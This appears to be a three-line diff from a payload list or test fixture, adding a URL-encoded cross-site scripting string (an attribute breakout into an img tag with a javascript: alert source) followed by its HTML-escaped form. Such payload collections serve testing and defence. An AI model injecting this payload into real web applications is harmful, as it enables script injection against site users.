@@ -1,0 +1,3 @@
+>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>
+--
+&gt;%22%27&gt;&lt;img%20src%3d%22javascript:alert(%27%20XSS%27)%22&gt;
